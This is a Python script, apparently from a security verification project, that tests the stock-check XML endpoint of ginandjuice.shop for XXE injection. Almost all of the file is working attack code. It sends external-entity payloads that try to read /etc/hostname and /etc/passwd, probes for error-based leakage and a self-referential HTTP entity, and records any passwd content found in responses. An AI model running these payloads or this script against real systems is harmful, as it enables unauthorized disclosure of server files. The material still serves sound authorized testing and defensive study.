#!/usr/bin/env python3
"""IV-13 Phase 6: ginandjuice.shop stock checker — XML endpoint / XXE adjudication.
Evidence: POST /catalog/product/stock with form-encoding returned 400 'XML parsing error'
=> endpoint expects an XML body. Classic in-band XXE test surface.
Tests:
  X0 well-formed XML baseline
  X1 XXE file read (file:///etc/hostname) referenced in productId
  X2 XXE file read (file:///etc/passwd) — bigger content
  X3 XXE error-based (external entity -> error message leaks content?)
  X4 external HTTP entity to the site itself (self-referential, no third party)
stdlib only."""
import json, os, re, time, ssl, urllib.request, urllib.error, http.cookiejar
from datetime import datetime, timezone, timedelta

BASE = 'https://ginandjuice.shop'
UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 IV13-IndependentVerifier/1.0'
CTX = ssl.create_default_context()
OUT = '/home/z/my-project/scripts/iv_out'
TZ = timezone(timedelta(hours=2))

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def build():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                       urllib.request.HTTPSHandler(context=CTX), NoRedirect()), cj

def post_xml(opener, xml, headers=None):
    hdrs = {'User-Agent': UA, 'Content-Type': 'application/xml',
            'Referer': BASE + '/catalog/product?productId=1', 'Origin': BASE}
    if headers:
        hdrs.update(headers)
    r = urllib.request.Request(BASE + '/catalog/product/stock', data=xml.encode(), headers=hdrs, method='POST')
    try:
        resp = opener.open(r, timeout=25)
        return {'status': resp.status, 'body': resp.read().decode('utf-8', 'replace')}
    except urllib.error.HTTPError as e:
        return {'status': e.code, 'body': e.read().decode('utf-8', 'replace')}
    except Exception as e:
        return {'status': None, 'body': repr(e)[:150]}

op, cj = build()
# establish session like a real user
urllib.request.install_opener = None
req0 = urllib.request.Request(BASE + '/catalog/product?productId=1', headers={'User-Agent': UA})
try:
    op.open(req0, timeout=25).read()
except Exception:
    pass

results = {'ts': datetime.now(TZ).isoformat(timespec='seconds'), 'tests': []}

XML_BASE = '<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
XML_XXE_HOSTNAME = ('<?xml version="1.0" encoding="UTF-8"?>'
                    '<!DOCTYPE stockCheck [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
                    '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>')
XML_XXE_PASSWD = ('<?xml version="1.0" encoding="UTF-8"?>'
                  '<!DOCTYPE stockCheck [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                  '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>')
XML_XXE_ERR = ('<?xml version="1.0" encoding="UTF-8"?>'
               '<!DOCTYPE stockCheck [<!ENTITY xxe SYSTEM "file:///nonexistent-iv13">]>'
               '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>')
XML_XXE_HTTP = ('<?xml version="1.0" encoding="UTF-8"?>'
                '<!DOCTYPE stockCheck [<!ENTITY xxe SYSTEM "https://ginandjuice.shop/catalog">]>'
                '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>')

for label, xml in [('X0-baseline', XML_BASE), ('X1-hostname', XML_XXE_HOSTNAME),
                   ('X2-passwd', XML_XXE_PASSWD), ('X3-errbased', XML_XXE_ERR),
                   ('X4-http-self', XML_XXE_HTTP)]:
    r = post_xml(op, xml)
    body_head = r['body'][:300]
    hostname_leak = 'iv13' in r['body']
    findings = []
    if 'root:' in r['body']:
        findings.append('PASSWD-CONTENT-IN-RESPONSE')
    rec = {'label': label, 'status': r['status'], 'len': len(r['body']),
           'body_head': body_head, 'flag': findings}
    results['tests'].append(rec)
    print('%-14s %s len=%-5d %s' % (label, r['status'], len(r['body']), body_head[:160].replace('\n', ' ')), flush=True)
    time.sleep(0.6)

with open(os.path.join(OUT, 'gj_xxe.json'), 'w') as f:
    json.dump(results, f, indent=1, ensure_ascii=False)
print('\nsaved -> scripts/iv_out/gj_xxe.json')
